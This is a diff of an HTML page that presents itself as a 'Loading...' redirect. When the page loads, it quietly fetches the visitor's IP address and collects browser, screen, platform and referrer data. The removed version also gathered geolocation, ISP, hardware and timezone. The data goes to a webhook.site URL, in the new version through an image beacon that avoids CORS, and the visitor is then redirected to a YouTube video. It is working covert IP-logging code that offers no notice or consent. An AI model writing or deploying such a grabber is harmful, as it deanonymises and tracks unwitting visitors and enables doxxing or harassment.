@@ -27,89 +27,47 @@
 <body>
     <h2>Loading...</h2>
     <div class="spinner"></div>
-    <p>Please wait while we redirect you...</p>
+    <p>Please wait...</p>
 
     <script>
-        // ===== CONFIGURATION =====
         const WEBHOOK_URL = 'https://webhook.site/2b17dc40-ef1a-4a3d-b772-f39739292924f8';
-        const REDIRECT_TO = 'https://www.youtube.com/watch?v=jNQXAC9IVRw';
+        const REDIRECT_TO = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
 
-        // ===== DATA COLLECTION (No CORS issues) =====
-        async function captureInfo() {
+        async function sendData() {
             try {
-                // Get IP and location using ipify + ipapi (CORS-friendly)
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                const userIP = ipData.ip;
+                // Get IP
+                const ipResp = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResp.json();
 
-                // Get geolocation data
-                const geoResponse = await fetch(`https://ipapi.co/${userIP}/json/`);
-                const geoData = await geoResponse.json();
-
-                // Collect comprehensive data
+                // Build data object
                 const data = {
-                    timestamp: new Date().toISOString(),
-                    
-                    // IP & Location
-                    ip: userIP,
-                    city: geoData.city || 'Unknown',
-                    region: geoData.region || 'Unknown',
-                    country: geoData.country_name || 'Unknown',
-                    postal: geoData.postal || 'Unknown',
-                    latitude: geoData.latitude || 'Unknown',
-                    longitude: geoData.longitude || 'Unknown',
-                    isp: geoData.org || 'Unknown',
-                    
-                    // Browser info
-                    user_agent: navigator.userAgent,
+                    ip: ipData.ip,
+                    time: new Date().toISOString(),
+                    ua: navigator.userAgent,
                     platform: navigator.platform,
                     language: navigator.language,
-                    cookies_enabled: navigator.cookieEnabled,
-                    
-                    // Screen
-                    screen_resolution: `${screen.width}x${screen.height}`,
-                    color_depth: `${screen.colorDepth}-bit`,
-                    
-                    // Hardware
-                    cpu_cores: navigator.hardwareConcurrency || 'Unknown',
-                    device_memory: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'Unknown',
-                    touch_support: 'ontouchstart' in window,
-                    
-                    // Other
-                    referrer: document.referrer || 'Direct visit',
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    screen: screen.width + 'x' + screen.height,
+                    ref: document.referrer || 'direct'
                 };
 
-                // Send to webhook using form submission (avoids CORS)
-                const form = document.createElement('form');
-                form.method = 'POST';
-                form.action = WEBHOOK_URL;
-                form.target = '_blank';
+                // Send using Image beacon (no CORS!)
+                const params = new URLSearchParams(data).toString();
+                const img = new Image();
+                img.src = `${WEBHOOK_URL}?${params}`;
                 
-                const input = document.createElement('input');
-                input.type = 'hidden';
-                input.name = 'data';
-                input.value = JSON.stringify(data, null, 2);
-                form.appendChild(input);
-                
-                document.body.appendChild(form);
-                form.submit();
-                document.body.removeChild(form);
+                console.log('Sending data via image beacon');
 
-                console.log('Data sent:', data);
-
-            } catch (error) {
-                console.error('Error:', error);
-            } finally {
-                // Redirect after 3 seconds
-                setTimeout(() => {
-                    window.location.href = REDIRECT_TO;
-                }, 3000);
+            } catch(e) {
+                console.error(e);
             }
+            
+            // Redirect after 2 seconds
+            setTimeout(() => {
+                window.location.href = REDIRECT_TO;
+            }, 2000);
         }
 
-        // Run on load
-        captureInfo();
+        sendData();
     </script>
 </body>
 </html>
